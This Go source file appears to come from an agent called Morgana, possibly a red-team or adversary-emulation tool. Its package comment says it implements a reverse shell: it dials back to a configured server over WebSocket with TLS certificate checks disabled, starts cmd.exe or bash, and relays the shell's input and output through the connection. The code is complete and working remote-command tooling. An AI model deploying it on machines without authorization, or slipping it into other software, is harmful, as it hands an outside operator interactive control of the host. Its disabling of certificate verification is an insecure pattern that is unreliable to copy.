// Package console implements a reverse shell session over WebSocket.
// The agent connects back to the Morgana server, spawns a local shell
// (cmd.exe on Windows, bash/sh on Linux/macOS) and bridges stdin/stdout
// bidirectionally through the WebSocket connection.
package console

import (
	"crypto/tls"
	"io"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
	"github.com/x3m-ai/morgana-agent/internal/config"
	"github.com/x3m-ai/morgana-agent/internal/logger"
)

// Handler manages console sessions for one agent.
type Handler struct {
	cfg *config.Config
	log *logger.Logger
	mu  sync.Mutex
}

// New returns a new Handler.
func New(cfg *config.Config) *Handler {
	return &Handler{
		cfg: cfg,
		log: logger.New("morgana.console"),
	}
}

// Open connects to the server WebSocket, spawns a shell, and bridges traffic.
// Blocks until the session ends (WS disconnect OR shell exits).
func (h *Handler) Open(consolePaw string) {
	// Build WS URL from server URL
	serverURL := h.cfg.ServerURL
	serverURL = strings.Replace(serverURL, "https://", "wss://", 1)
	serverURL = strings.Replace(serverURL, "http://", "ws://", 1)
	wsURL := serverURL + "/api/v2/console/agent/" + consolePaw

	h.log.Info("[CONSOLE] === CONSOLE SESSION STARTING ===", map[string]any{
		"paw":        consolePaw,
		"server_url": h.cfg.ServerURL,
		"ws_url":     wsURL,
		"os":         runtime.GOOS,
		"arch":       runtime.GOARCH,
	})

	headers := http.Header{}
	headers.Set("Authorization", "Bearer "+h.cfg.AgentToken)

	dialer := websocket.Dialer{
		HandshakeTimeout: 10 * time.Second,
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true, //nolint:gosec // same policy as HTTP client: accept self-signed certs in lab environments
			MinVersion:         tls.VersionTLS12,
		},
	}

	h.log.Info("[CONSOLE] Dialing WebSocket ...", map[string]any{"ws_url": wsURL})
	conn, resp, err := dialer.Dial(wsURL, headers)
	if err != nil {
		statusCode := 0
		if resp != nil {
			statusCode = resp.StatusCode
		}
		h.log.Error("[CONSOLE] WebSocket dial FAILED", map[string]any{
			"url":         wsURL,
			"error":       err.Error(),
			"http_status": statusCode,
		})
		return
	}
	h.log.Info("[CONSOLE] WebSocket connected OK", map[string]any{"ws_url": wsURL})
	defer conn.Close()

	shell, args, workDir := shellConfig()

	h.log.Info("[CONSOLE] Shell config", map[string]any{
		"shell":   shell,
		"args":    args,
		"workDir": workDir,
	})

	// Create working directory if it does not exist
	if err := os.MkdirAll(workDir, 0o755); err != nil {
		h.log.Warn("[CONSOLE] Could not create workdir", map[string]any{
			"dir":   workDir,
			"error": err.Error(),
		})
		// Fall back to temp dir
		workDir = os.TempDir()
	}

	cmd := exec.Command(shell, args...)
	cmd.Dir = workDir

	stdinPipe, err := cmd.StdinPipe()
	if err != nil {
		h.log.Error("[CONSOLE] StdinPipe failed", map[string]any{"error": err.Error()})
		return
	}
	stdoutPipe, err := cmd.StdoutPipe()
	if err != nil {
		h.log.Error("[CONSOLE] StdoutPipe failed", map[string]any{"error": err.Error()})
		return
	}
	stderrPipe, err := cmd.StderrPipe()
	if err != nil {
		h.log.Error("[CONSOLE] StderrPipe failed", map[string]any{"error": err.Error()})
		return
	}

	if err := cmd.Start(); err != nil {
		h.log.Error("[CONSOLE] Shell start failed", map[string]any{
			"shell": shell,
			"error": err.Error(),
		})
		_ = conn.WriteMessage(websocket.TextMessage,
			[]byte("\r\n[ERROR] Failed to start shell: "+err.Error()+"\r\n"))
		return
	}

	h.log.Info("[CONSOLE] Shell started", map[string]any{
		"shell": shell,
		"pid":   cmd.Process.Pid,
		"dir":   workDir,
	})

	var wg sync.WaitGroup
	done := make(chan struct{})

	// writeMu serialises all conn.WriteMessage calls.
	// gorilla/websocket does NOT support concurrent writers - each goroutine
	// (stdout pipe, stderr pipe, exit banner) must take this lock before writing.
	var writeMu sync.Mutex

	// WS -> shell stdin
	wg.Add(1)
	go func() {
		defer wg.Done()
		defer close(done)
		for {
			_, msg, err := conn.ReadMessage()
			if err != nil {
				h.log.Warn("[CONSOLE] WS read error (stdin goroutine exiting)", map[string]any{"error": err.Error()})
				break
			}
			h.log.Debug("[CONSOLE] WS->stdin: writing %d bytes", map[string]any{"n": len(msg)})
			if _, err := stdinPipe.Write(msg); err != nil {
				h.log.Warn("[CONSOLE] stdin write error", map[string]any{"error": err.Error()})
				break
			}
		}
		// WS disconnected or stdin broken: kill shell
		h.log.Info("[CONSOLE] WS->stdin goroutine exiting, killing shell", nil)
		if cmd.Process != nil {
			_ = cmd.Process.Kill()
		}
	}()

	// shell stdout -> WS
	wg.Add(1)
	go func() {
		defer wg.Done()
		h.log.Debug("[CONSOLE] stdout->WS goroutine started", nil)
		pipeToWS(conn, stdoutPipe, "stdout", &writeMu, h)
		h.log.Debug("[CONSOLE] stdout->WS goroutine done", nil)
	}()

	// shell stderr -> WS
	wg.Add(1)
	go func() {
		defer wg.Done()
		h.log.Debug("[CONSOLE] stderr->WS goroutine started", nil)
		pipeToWS(conn, stderrPipe, "stderr", &writeMu, h)
		h.log.Debug("[CONSOLE] stderr->WS goroutine done", nil)
	}()

	// Wait for shell to exit
	exitErr := cmd.Wait()
	h.log.Info("[CONSOLE] Shell exited", map[string]any{"err": exitErr})
	exitMsg := "\r\n[CONSOLE] Shell exited."
	if exitErr != nil {
		exitMsg += " (" + exitErr.Error() + ")"
	}
	exitMsg += "\r\n"
	writeMu.Lock()
	_ = conn.WriteMessage(websocket.TextMessage, []byte(exitMsg))
	writeMu.Unlock()
	time.Sleep(300 * time.Millisecond)

	// Close the WS connection to unblock the WS-reader goroutine (which is
	// blocked in conn.ReadMessage). Without this, wg.Wait() would deadlock when
	// cmd.exe exits naturally (e.g. user types "exit").
	_ = conn.Close()
	wg.Wait()

	h.log.Info("[CONSOLE] Session closed", map[string]any{"paw": consolePaw})
}

// pipeToWS reads from r and forwards every chunk as a WebSocket text message.
// writeMu must be held for every WriteMessage call to avoid concurrent-writer
// corruption (gorilla/websocket requires single-writer access).
func pipeToWS(conn *websocket.Conn, r io.Reader, label string, writeMu *sync.Mutex, h *Handler) {
	buf := make([]byte, 4096)
	for {
		n, err := r.Read(buf)
		if n > 0 {
			h.log.Info("[CONSOLE] "+label+"->WS: read %d bytes", map[string]any{"n": n})
			writeMu.Lock()
			writeErr := conn.WriteMessage(websocket.TextMessage, buf[:n])
			writeMu.Unlock()
			if writeErr != nil {
				h.log.Warn("[CONSOLE] "+label+"->WS: WriteMessage failed", map[string]any{"error": writeErr.Error()})
				return
			}
		}
		if err != nil {
			h.log.Debug("[CONSOLE] "+label+"->WS: pipe EOF/error", map[string]any{"error": err.Error()})
			break
		}
	}
}

// shellConfig returns the shell binary, arguments, and working directory
// appropriate for the current OS.
func shellConfig() (shell string, args []string, workDir string) {
	switch runtime.GOOS {
	case "windows":
		workDir = `C:\merlino`
		// No flags.  With piped stdin, cmd.exe automatically enters batch
		// mode: no prompt shown, no command echo.  /Q and /K "@echo off"
		// were both tried before and caused problems (immediate exit or
		// visible "@echo off" line).  The PS1 terminal handles prompt
		// rendering and local keyboard echo on its own.
		return "cmd.exe", []string{}, workDir
	case "darwin":
		workDir = "/merlino"
		if _, err := os.Stat("/bin/bash"); err == nil {
			return "/bin/bash", []string{"-s"}, workDir
		}
		return "/bin/sh", []string{"-s"}, workDir
	default:
		// Linux and everything else
		workDir = "/merlino"
		if _, err := os.Stat("/bin/bash"); err == nil {
			return "/bin/bash", []string{"-s"}, workDir
		}
		return "/bin/sh", []string{"-s"}, workDir
	}
}
